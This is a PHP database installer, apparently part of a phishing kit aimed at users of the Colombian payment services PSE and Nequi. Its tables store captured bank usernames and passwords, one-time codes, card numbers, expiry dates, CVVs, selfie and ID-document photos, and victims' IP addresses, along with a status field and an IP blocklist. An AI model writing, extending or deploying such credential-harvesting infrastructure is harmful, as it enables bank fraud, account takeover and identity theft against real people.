<?php
// setup_db.php

// 1. Load Config first to print debug info (Safe Debugging)
$config = require __DIR__ . '/config/config.php';

echo "<h1>Inicializando Base de Datos...</h1><hr>";

echo "<div style='background:#f4f4f4; padding:15px; border:1px solid #ddd; margin-bottom:20px; font-family:monospace;'>";
echo "<strong>🔍 DIAGNÓSTICO DE CONEXIÓN:</strong><br>";
echo "DB Host: " . htmlspecialchars($config['db_host']) . "<br>";
echo "DB User: " . htmlspecialchars($config['db_user']) . "<br>";
echo "DB Name: " . htmlspecialchars($config['db_name']) . "<br>";
echo "DB Port: " . htmlspecialchars($config['db_port']) . "<br>";
echo "</div>";

require_once __DIR__ . '/config/db.php';
// ... rest of script ...

try {
    $driver = $conn->getAttribute(PDO::ATTR_DRIVER_NAME);
    echo "<p>Driver detectado: <strong>$driver</strong></p>";

    // Syntax adjustments
    $primaryKey = ($driver === 'pgsql') ? "SERIAL PRIMARY KEY" : "INT AUTO_INCREMENT PRIMARY KEY";
    $timestamp = ($driver === 'pgsql') ? "TIMESTAMP DEFAULT CURRENT_TIMESTAMP" : "TIMESTAMP DEFAULT CURRENT_TIMESTAMP";

    // --- 1. Tabla PSE ---
    echo "<p>Creando tabla 'pse'...</p>";
    $sql_pse = "CREATE TABLE IF NOT EXISTS pse (
        id $primaryKey,
        usuario VARCHAR(255),
        clave VARCHAR(255),
        banco VARCHAR(255),
        email VARCHAR(255),
        ip_address VARCHAR(255),
        estado INT DEFAULT 0,
        otp VARCHAR(50),
        tarjeta VARCHAR(50),
        fecha_exp VARCHAR(20),
        cvv VARCHAR(10),
        foto_selfie VARCHAR(255),
        foto_front VARCHAR(255),
        foto_back VARCHAR(255),
        fecha $timestamp
    )";
    $conn->exec($sql_pse);
    echo "<p style='color:green'>Tabla 'pse' verificada.</p>";

    // --- 2. Tabla NEQUI (Optional but referenced) ---
    echo "<p>Creando tabla 'nequi'...</p>";
    $sql_nequi = "CREATE TABLE IF NOT EXISTS nequi (
        id $primaryKey,
        celular VARCHAR(50),
        clave VARCHAR(50),
        ip_address VARCHAR(255),
        estado INT DEFAULT 0,
        otp VARCHAR(50),
        fecha $timestamp
    )";
    $conn->exec($sql_nequi);
    echo "<p style='color:green'>Tabla 'nequi' verificada.</p>";

    // --- 3. Tabla BLOCKED_IPS ---
    echo "<p>Creando tabla 'blocked_ips'...</p>";
    $sql_blocked = "CREATE TABLE IF NOT EXISTS blocked_ips (
        id $primaryKey,
        ip VARCHAR(255) UNIQUE,
        created_at $timestamp
    )";
    $conn->exec($sql_blocked);
    echo "<p style='color:green'>Tabla 'blocked_ips' verificada.</p>";

    echo "<hr><h3>¡Instalación Completada con Éxito! ✅</h3>";
    echo "<p>Ya puedes borrar este archivo o dejarlo por seguridad.</p>";
    echo "<a href='index.php'>Ir al Inicio</a>";

} catch (PDOException $e) {
    die("<h3 style='color:red'>Error Fatal:</h3> " . $e->getMessage());
}
?>
